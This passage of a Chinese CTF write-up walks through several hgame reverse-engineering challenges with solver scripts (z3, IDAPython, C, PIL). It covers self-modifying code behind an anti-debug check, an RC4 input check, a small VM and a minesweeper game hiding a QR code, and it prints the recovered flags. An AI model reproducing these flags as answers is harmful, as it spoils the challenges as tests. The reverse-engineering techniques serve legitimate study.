class="number">22890</span>] = <span class="string">'u'</span>, a[<span class="number">0x803B</span>] = <span class="string">'m'</span>, a[<span class="number">0x655B</span>] = <span class="string">'d'</span>, a[<span class="number">0xDC3A</span>] = <span class="string">'z'</span>;</span><br><span class="line">a[<span class="number">0x3599</span>] = <span class="string">'o'</span>, a[<span class="number">44072</span>] = <span class="string">'k'</span>, a[<span class="number">0xB205</span>] = <span class="string">'N'</span>, a[<span class="number">0xBB43</span>] = <span class="string">'F'</span>;</span><br><span class="line">a[<span class="number">80939</span>] = <span class="string">'7'</span>, a[<span class="number">0x3F07</span>] = <span class="string">'f'</span>, a[<span class="number">52068</span>] = <span class="string">'o'</span>, a[<span class="number">0xCAA2</span>] = <span class="string">' '</span>;</span><br><span class="line">a[<span class="number">72519</span>] = <span class="string">'_'</span>, a[<span class="number">0x11F52</span>] = <span class="string">'k'</span>, a[<span class="number">0x3CA5</span>] = <span class="string">'q'</span>, a[<span class="number">75894</span>] = <span class="string">'F'</span>;</span><br><span class="line">a[<span class="number">0xF723</span>] = <span class="string">'e'</span>, a[<span class="number">0x7221</span>] = <span class="string">'u'</span>, a[<span class="number">0x2FCD</span>] = <span class="string">' '</span>, a[<span class="number">3501</span>] = <span class="string">'d'</span>;</span><br><span class="line">a[<span class="number">0x9168</span>] = <span class="string">'e'</span>, a[<span class="number">0x8DC6</span>] = <span class="string">' '</span>, a[<span class="number">0x100CF</span>] = <span class="string">'s'</span>, a[<span class="number">0xCD51</span>] = <span class="string">'m'</span>;</span><br><span class="line">a[<span class="number">0x10B56</span>] = <span class="string">'d'</span>, a[<span class="number">0x6ABD</span>] = <span class="string">' '</span>, a[<span class="number">0x103F7</span>] = <span class="string">'y'</span>, a[<span class="number">60485</span>] = <span class="string">'x'</span>;</span><br><span class="line">a[<span class="number">0x9589</span>] = <span class="string">'u'</span>, a[<span class="number">0x1105E</span>] = <span class="string">'3'</span>, a[<span class="number">54002</span>] = <span class="string">'b'</span>, a[<span class="number">0x12C3F</span>] = <span class="string">'1'</span>;</span><br><span class="line">a[<span class="number">0x6750</span>] = <span class="string">','</span>, a[<span class="number">0xBFCB</span>] = <span class="string">' '</span>, a[<span class="number">70562</span>] = <span class="string">'_'</span>, a[<span class="number">0xE66F</span>] = <span class="string">' '</span>;</span><br><span class="line">a[<span class="number">47203</span>] = <span class="string">'q'</span>, a[<span class="number">0x4994</span>] = <span class="string">'f'</span>, a[<span class="number">0xF098</span>] = <span class="string">'s'</span>, a[<span class="number">0xC131</span>] = <span class="string">'r'</span>;</span><br><span class="line">a[<span class="number">0x16FB</span>] = <span class="string">'g'</span>, a[<span class="number">74919</span>] = <span class="string">'z'</span>, a[<span class="number">0xA96B</span>] = <span class="string">' '</span>, a[<span class="number">0x4558</span>] = <span class="string">'r'</span>;</span><br><span class="line">a[<span class="number">0x222F</span>] = <span class="string">'z'</span>, a[<span class="number">0xAAD0</span>] = <span class="string">'n'</span>, a[<span class="number">0x9841</span>] = <span class="string">'z'</span>, a[<span class="number">71894</span>] = <span class="string">'3'</span>;</span><br><span class="line">a[<span class="number">0x8AF0</span>] = <span class="string">'s'</span>, a[<span class="number">0x2BFF</span>] = <span class="string">'t'</span>, a[<span class="number">0x525F</span>] = <span class="string">'b'</span>, a[<span class="number">0x9995</span>] = <span class="string">'e'</span>;</span><br><span class="line">a[<span class="number">68035</span>] = <span class="string">'&#123;'</span>, a[<span class="number">0xA375</span>] = <span class="string">'q'</span>, a[<span class="number">10949</span>] = <span class="string">'f'</span>, a[<span class="number">0x63DD</span>] = <span class="string">'q'</span>;</span><br><span class="line">a[<span class="number">0xA621</span>] = <span class="string">'p'</span>, a[<span class="number">78398</span>] = <span class="string">'_'</span>, a[<span class="number">0x10780</span>] = <span class="string">'q'</span>, a[<span class="number">0x609E</span>] = <span class="string">'t'</span>;</span><br><span class="line">a[<span class="number">9603</span>] = <span class="string">'!'</span>, a[<span class="number">0x7E5F</span>] = <span class="string">'t'</span>, a[<span class="number">0x83C0</span>] = <span class="string">'x'</span>, a[<span class="number">0x8A6D</span>] = <span class="string">'z'</span>;</span><br><span class="line">a[<span class="number">0x1309A</span>] = <span class="string">'3'</span>, a[<span class="number">0xB8F4</span>] = <span class="string">'O'</span>, a[<span class="number">54430</span>] = <span class="string">'m'</span>, a[<span class="number">0x143CF</span>] = <span class="string">'w'</span>;</span><br><span class="line">a[<span class="number">40499</span>] = <span class="string">'u'</span>, a[<span class="number">0xD882</span>] = <span class="string">'u'</span>, a[<span class="number">0xB5DB</span>] = <span class="string">'f'</span>, a[<span class="number">0x931B</span>] = <span class="string">' '</span>;</span><br><span class="line">a[<span class="number">0x1FB0</span>] = <span class="string">'u'</span>, a[<span class="number">0xF2F2</span>] = <span class="string">' '</span>, a[<span class="number">0x5031</span>] = <span class="string">'m'</span>, a[<span class="number">0x12720</span>] = <span class="string">'4'</span>;</span><br><span class="line">a[<span class="number">0x6649</span>] = <span class="string">'q'</span>, a[<span class="number">0xBCA1</span>] = <span class="string">'R'</span>, a[<span class="number">24004</span>] = <span class="string">' '</span>, a[<span class="number">0x10180</span>] = <span class="string">'m'</span>;</span><br><span class="line">a[<span class="number">77170</span>] = <span class="string">'h'</span>, a[<span class="number">0x7B3C</span>] = <span class="string">'o'</span>, a[<span class="number">3019</span>] = <span class="string">'s'</span>, a[<span class="number">20120</span>] = <span class="string">' '</span>;</span><br><span class="line">a[<span class="number">74113</span>] = <span class="string">'_'</span>, a[<span class="number">0xDD23</span>] = <span class="string">','</span>, a[<span class="number">58044</span>] = <span class="string">'f'</span>, a[<span class="number">79659</span>] = <span class="string">'z'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">0xfffffff</span>; i++)</span><br><span class="line"><span class="keyword">if</span>(a[i])</span><br><span class="line"><span class="built_in">putchar</span>(a[i]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到<strong>Oazsdgmpgmfuaz! ftq eqodqf ar ftq mbbe ue tqdq, ftue otmxxqzsq ue uzebudqp nk NkfqOFR arrxuzq omybmusz, ftq rxms ue tsmyq{dQh3x_y3_nk_z4F1h3_0d_zi7I0dw}</strong>，可以看到最后和flag的格式是一样的了，字符数都是一样的，整个字符串的特征猜测凯撒加密。</p><p>从位移12得到结果：</p><p><img src="https://i.loli.net/2021/02/27/ruso9GQJk7PqxYE.png" alt="image-20210227112643799"></p><h3 id="FAKE"><a href="#FAKE" class="headerlink" title="FAKE"></a>FAKE</h3><p>开始没注意，以为就是考下z3的使用，且题目中有提示：<strong>Try angr or z3.</strong>，上来就把36个方程组去写z3，没有发现解。。也可能是我的约束条件写错了。。</p><p>之后注意到题目名字fake，进而看了看程序，发现一个获取TracerPid的反调试和紧接着的smc：</p><p><img src="https://i.loli.net/2021/02/27/UxcMZYkvEy4TsDh.png" alt="image-20210217162653310"></p><p>自己查看一下非调试运行时的状态：<br><img src="https://i.loli.net/2021/02/27/rS7LQ2zW3DjHcZx.png" alt="image-20210217162839393"></p><p>使用idapython或调试到smc后的代码，其实就是2个矩阵的乘法：</p><p><img src="https://i.loli.net/2021/02/27/VhjmxeSoF9OPayk.png" alt="image-20210217163037584"></p><p>先z3解一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">flag = [BitVec(<span class="string">'flag[%d]'</span>%i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">36</span>)]</span><br><span class="line"></span><br><span class="line">a = [<span class="number">104</span>, <span class="number">103</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">123</span>, <span class="number">64</span>, <span class="number">95</span>, <span class="number">70</span>, <span class="number">65</span>, <span class="number">75</span>, <span class="number">69</span>, <span class="number">95</span>, <span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">33</span>, <span class="number">45</span>, <span class="number">100</span>, <span class="number">111</span>, <span class="number">95</span>, <span class="number">89</span>, <span class="number">48</span>, <span class="number">117</span>, <span class="number">95</span>, <span class="number">107</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">119</span>, <span class="number">95</span>, <span class="number">83</span>, <span class="number">77</span>, <span class="number">67</span>, <span class="number">63</span>, <span class="number">125</span>]</span><br><span class="line"></span><br><span class="line">b = [<span class="number">55030</span>, <span class="number">61095</span>, <span class="number">60151</span>, <span class="number">57247</span>, <span class="number">56780</span>, <span class="number">55726</span>, <span class="number">46642</span>, <span class="number">52931</span>, <span class="number">53580</span>, <span class="number">50437</span>, <span class="number">50062</span>, <span class="number">44186</span>, <span class="number">44909</span>, <span class="number">46490</span>, <span class="number">46024</span>, <span class="number">44347</span>, <span class="number">43850</span>, <span class="number">44368</span>, <span class="number">54990</span>, <span class="number">61884</span>, <span class="number">61202</span>, <span class="number">58139</span>, <span class="number">57730</span>, <span class="number">54964</span>, <span class="number">48849</span>, <span class="number">51026</span>, <span class="number">49629</span>, <span class="number">48219</span>, <span class="number">47904</span>, <span class="number">50823</span>, <span class="number">46596</span>, <span class="number">50517</span>, <span class="number">48421</span>, <span class="number">46143</span>, <span class="number">46102</span>, <span class="number">46744</span>]</span><br><span class="line">ans = [<span class="number">0</span>]*<span class="number">36</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">ans[<span class="number">6</span>*i+j] += a[<span class="number">6</span>*k+j] * flag[<span class="number">6</span>*i+k]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">s.add(b[<span class="number">6</span>*i+j] == ans[<span class="number">6</span>*i+j])</span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">flag = [s.model()[i].as_long() <span class="keyword">for</span> i <span class="keyword">in</span> flag]</span><br><span class="line">print(bytes(flag))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">print(<span class="string">"unsat"</span>)</span><br><span class="line"><span class="comment">#hgame&#123;E@sy_Se1f-Modifying_C0oodee33&#125;</span></span><br></pre></td></tr></table></figure><p>再使用sage求解看，实质就是先求得一个逆矩阵然后与enc组成的矩阵做乘法。</p><p><img src="https://i.loli.net/2021/02/27/hPdyLxSuDFpTRZE.png" alt="image-20210217163948621"></p><h3 id="helloRe3"><a href="#helloRe3" class="headerlink" title="helloRe3"></a>helloRe3</h3><p>一血。</p><p>开始每管题目的提示信息，直接静态分析了下，看见创建了一个线程，后面开始注册窗口各种操作，然后越看越复杂，定位到这个函数，有iv，key和加密解密操作，从常量识别出是tea类的加密算法？但这个也无从下手，程序中好像没调用这里。。。</p><p><img src="https://i.loli.net/2021/02/27/gdX7jNlDYhB2fJv.png" alt="image-20210217164757847"></p><p>嗯，，回到题目开始看提示信息：开发者留下了调试信息，试试DbgView。就试试吧。</p><p>可以发现，每次输入都会输出相应的响应：</p><p><img src="https://i.loli.net/2021/02/27/6AUTcPakH9fLeiq.png" alt="image-20210217165042094"></p><p>这里我直接去定位input length，因为之前静态分析时看见过。</p><p><img src="https://i.loli.net/2021/02/27/vicGJT4f5utmgY9.png" alt="image-20210217165253173"></p><p>其实上面这个整个函数就是关键了，简单看下汇编，结合DbgView。</p><p>输入长度为20，每一位先和0xff进行异或运算，最后来个rc4加密再和密文比较。<strong>注意：输入的是每个字符的order值，从DbgView可以查看。</strong></p><p>我直接附加调试得到内存信息，然后idapython得到order值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ida_bytes <span class="keyword">import</span> *</span><br><span class="line">addr = <span class="number">0x7FF7E35B5820</span></span><br><span class="line">addr1 = <span class="number">0x07FF7E35A3720</span></span><br><span class="line">flag = []</span><br><span class="line">s = [<span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>]</span><br><span class="line">s = [i^<span class="number">0xff</span> <span class="keyword">for</span> i <span class="keyword">in</span> s]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">    flag += [(s[i]^get_byte(addr) ^ get_byte(addr1)) ^<span class="number">0xff</span>]</span><br><span class="line">    addr += <span class="number">1</span></span><br><span class="line">    addr1 += <span class="number">1</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>最后用C语言写一个置表得到输入。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> a[] = &#123;<span class="number">59</span>, <span class="number">58</span>, <span class="number">54</span>, <span class="number">72</span>, <span class="number">39</span>, <span class="number">47</span>, <span class="number">26</span>, <span class="number">31</span>,</span><br><span class="line"> <span class="number">61</span>, <span class="number">24</span>, <span class="number">61</span>, <span class="number">74</span>, <span class="number">24</span>, <span class="number">40</span>, <span class="number">32</span>, <span class="number">23</span>,</span><br><span class="line">  <span class="number">68</span>, <span class="number">24</span>, <span class="number">41</span>, <span class="number">48</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> b[<span class="number">1000</span>];</span><br><span class="line"><span class="keyword">char</span> s1[] = <span class="string">"1234567890-+"</span>;</span><br><span class="line"><span class="keyword">char</span> s2[] = <span class="string">"QWERTYUIOP&#123;&#125;|"</span>;</span><br><span class="line"><span class="keyword">char</span> s3[] = <span class="string">"ASDFGHJKL;'"</span>;</span><br><span class="line"><span class="keyword">char</span> s4[] = <span class="string">"ZXCVBNM,./"</span>;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">50</span>];</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">21</span>; i &lt;= <span class="number">32</span>; i++)</span><br><span class="line">b[i] = s1[j++];</span><br><span class="line">j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">37</span>; i &lt;= <span class="number">49</span>; i++)</span><br><span class="line">b[i] = s2[j++];</span><br><span class="line">j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">54</span>; i &lt;= <span class="number">64</span>; i++)</span><br><span class="line">b[i] = s3[j++];</span><br><span class="line">j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">66</span>; i &lt;= <span class="number">75</span>; i++)</span><br><span class="line">b[i] = s4[j++];</span><br><span class="line">j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++)</span><br><span class="line">flag[i] = b[a[i]];</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(flag);</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//HGAME&#123;6-K4K.4R+3C4T&#125;</span></span><br></pre></td></tr></table></figure><h3 id="vm"><a href="#vm" class="headerlink" title="vm"></a>vm</h3><p>二血。</p><p>一个简单的vm，调试跟踪得到先是找到输入的最后一位，开始从后向前进行指定值的异或运算，紧接着一轮从后向前的减法运算。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> enc[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">207</span>, <span class="number">191</span>, <span class="number">128</span>,  <span class="number">59</span>, <span class="number">246</span>, <span class="number">175</span>, <span class="number">126</span>,   <span class="number">2</span>,  <span class="number">36</span>, <span class="number">237</span>, </span><br><span class="line">  <span class="number">112</span>,  <span class="number">58</span>, <span class="number">244</span>, <span class="number">235</span>, <span class="number">122</span>,  <span class="number">74</span>, <span class="number">231</span>, <span class="number">247</span>, <span class="number">162</span>, <span class="number">103</span>, </span><br><span class="line">   <span class="number">23</span>, <span class="number">240</span>, <span class="number">198</span>, <span class="number">118</span>,  <span class="number">54</span>, <span class="number">232</span>, <span class="number">173</span>, <span class="number">130</span>,  <span class="number">46</span>, <span class="number">219</span>, </span><br><span class="line">  <span class="number">183</span>,  <span class="number">79</span>, <span class="number">230</span>,   <span class="number">9</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> a = <span class="number">0xfe</span>, b = <span class="number">0x7a</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">33</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">&#123;</span><br><span class="line">enc[i] += b;</span><br><span class="line">b -= <span class="number">0x60</span>;</span><br><span class="line">enc[i] ^= a;</span><br><span class="line">a += <span class="number">0x23</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">34</span>; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, enc[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="A-5-Second-Challenge"><a href="#A-5-Second-Challenge" class="headerlink" title="A 5 Second Challenge"></a>A 5 Second Challenge</h3><p>一个扫雷游戏，第一步操作后，如果后面时间超过5s的话游戏结束。这个修改下系统时间就解除了。</p><p>找到关键数据文件夹：</p><p><img src="https://i.loli.net/2021/02/27/oezlBwiY5mTZuOA.png" alt="image-20210227114208257"></p><p>反编译AFiveSecondChallenge.dll：看到获取当前系统的时间，检查是否超时的函数，题目描述的一样，对dll做了手脚，也是<strong>CheckBomAt</strong>这个函数，最后有很多数据，从数量可以猜测对应我们题目中的45*45的格子。</p><p><img src="https://i.loli.net/2021/02/27/CyHbQdXat52eZkR.png" alt="image-20210227114516330"></p><p>现在目的就是找<strong>CheckBomAt</strong>函数，开始想的是可能有办法修复这个dll，搜索一番没有结果。</p><p>转到刚刚那个文件夹的，发现2个关键cpp文件：AFiveSecondChallenge.cpp，Assembly-CSharp.cpp。</p><p>在AFiveSecondChallenge.cpp中发现反编译不出来的函数：从名字可以很好识别其功能，开始做一个超时检查，如果没超时取出matrix中的数据做一个运算后判断。</p><p><img src="https://i.loli.net/2021/02/27/NdvUQpMXrFontj9.png" alt="image-20210227120034686"></p><p>然后从Assembly-CSharp.cpp中看到了整个游戏逻辑。注释相当于把源码都给了吧，真好。</p><p>捕捉鼠标点击后，开始进行各种判断。</p><p><img src="https://i.loli.net/2021/02/27/4rOwLYtVzcUlDmf.png" alt="image-20210227120525813"></p><p>计算周围的雷数，就是判断8个方向，也可以看出返回值为0代表不是雷：</p><p><img src="https://i.loli.net/2021/02/27/e9vF4mky3D5oiHp.png" alt="image-20210227122637114"></p><p>点击后，根据是雷或者不是雷填充对应的色块：</p><p><img src="https://i.loli.net/2021/02/27/kB8jiNXfsgQzJ4H.png" alt="image-20210227122902913"></p><p>如果点击块周围没有雷，则递归的向四个方向扩展开来：</p><p><img src="https://i.loli.net/2021/02/27/gD1dcpLSm9QAvo2.png" alt="image-20210227123011364"></p><p>分析到这里想找最后胜利的判断条件以此看flag怎么来的，好像没有，。。</p><p>到这里知道了关键就是判断一个块是否是雷的函数<strong>CheckBomAt</strong>，按照题目的算法打印出雷的位置，1表示雷。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">double</span> a[<span class="number">45</span>][<span class="number">15</span>][<span class="number">3</span>] = &#123;游戏中的数据&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">double</span> ans;</span><br><span class="line"><span class="keyword">double</span> a_, b_, c_, d_;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, k = <span class="number">0</span>, bomb[<span class="number">45</span>][<span class="number">45</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">45</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">45</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">a_ = a[j][i/<span class="number">3</span>][<span class="number">0</span>];</span><br><span class="line">b_ = a[j][i/<span class="number">3</span>][<span class="number">1</span>];</span><br><span class="line">c_ = a[j][i/<span class="number">3</span>][<span class="number">2</span>];</span><br><span class="line">d_ = (<span class="keyword">double</span>)(i%<span class="number">3</span> - <span class="number">1.0</span>);</span><br><span class="line">ans = (a_*d_*d_ + b_*d_) + c_;</span><br><span class="line">bomb[j][i] = ans &gt; <span class="number">0.0</span> ? <span class="number">1</span>:<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">45</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">45</span>; j++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d "</span>, bomb[i][j]);</span><br><span class="line"><span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用这个数据玩了一下游戏，但是有的地方和算出的雷的位置不一致，大多数还是一样的。。然后一直找是不是哪里算错了，算法也比对了好几次。。就把题放一边了。</p><p>后面看见题目给出提示，二维码，看了看我之前打印的数据。。。</p><p><img src="https://i.loli.net/2021/02/27/iQqyeAYgFaJVoMc.png" alt="image-20210227020942288"></p><p>使用python的PIL模块用这个数据打印出二维码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">x = <span class="number">45</span></span><br><span class="line">y = <span class="number">45</span></span><br><span class="line"></span><br><span class="line">im = Image.new(<span class="string">'RGB'</span>, (x, y))</span><br><span class="line">data = <span class="string">'111111100011101111100101000001110100101111111100000100001011111010001110100011001001000001101110101110100100000100111010100101001011101101110101101010111001001001001111101101011101101110101110001100101111111011101111101011101100000101011000100101000100011111000001000001111111101010101010101010101010101010101111111000000001100001101111000111101010000100000000101111100001111010101111111000000000101111100000100010001011011110010110001010001010000001000101111000011001000111010110100010011001110010100001000010001111010011000100111000001100100110101111100101101101010101110010010101001010001011101001011011101100000101101110000110010000111101101001010000100101110010010101100101111011101101110000101111101101101000100110110100101000010101010000101010100001110011100000010001001001000100010111111101101100111000011110100010000010100111000011011001010010011000001010101101011111000000101010011011011001011111111100110100101111110001000110111110111111110001100000011111000100011110010100011101001010101001011101011010110010000101101011010101110001100001010011000110010100011100011100001111111101110011011111110001111110111110001111110011111001100101101000010101001001101001100100110100111010001011001011111111011110010010011001000011110111111111101001000100011111011001111110011100011010101010010100001111000011011011001000001000100011111010000111001000100100101001100110001101100010111110010000011011101010111101010100000100001101011010011001110011100010111111000101110101110110010100111001110010111010001101000100001110010100010110000010111111000000010010110100110101110111100011110011101001101111111011001100100011010110100110100011100010011111101000111000111111100000000001110101000011000111001101101100010100111111100101011000101010100000011000101011110100000101100000110101000111001010110100011111101110101111001110001111110000000101111110000101110101111010011010010010011010001111001111101110101110100010000101010010100100101101100100000100111010110100001100000101111111001100111111101000101001110100110101100000100100010'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, x):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, y):</span><br><span class="line">        line = data[i*x+j]</span><br><span class="line">        <span class="keyword">if</span> line == <span class="string">'1'</span>:</span><br><span class="line">            im.putpixel((i, j), (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            im.putpixel((i, j), (<span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>))</span><br><span class="line">im.show()</span><br></pre></td></tr></table></figure><p>扫一下得到flag：<strong>hgame{YOU<del>hEn-duO_yOU-X|</del>DOU-sHi<del>un1Ty</del>k4i-fA_de_O}</strong></p><h3 id="nllvm"><a href="#nllvm" class="headerlink" title="nllvm"></a>nllvm</h3><p>一血。</p><p>通过这个题学习熟悉下AES加密算法还是不错的。</p><p>首先看一下main函数：先设置控制台显示文本的属性，接着可以看到很多异或运算，这些数据在要使用后同样做了相同的异或运算，所以简单隐藏了下程序中的数据。</p><p><img 